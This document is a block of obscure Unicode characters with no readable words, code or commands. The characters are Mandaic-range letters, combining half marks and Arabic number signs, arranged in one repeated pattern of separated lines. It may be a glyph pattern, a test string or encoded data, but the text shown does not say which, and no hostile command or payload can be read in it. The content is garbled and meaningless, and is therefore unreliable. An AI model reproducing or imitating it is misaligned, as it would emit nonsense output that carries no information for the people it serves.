࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙𞋬𞋬𞋬𞋬𞋬𞋬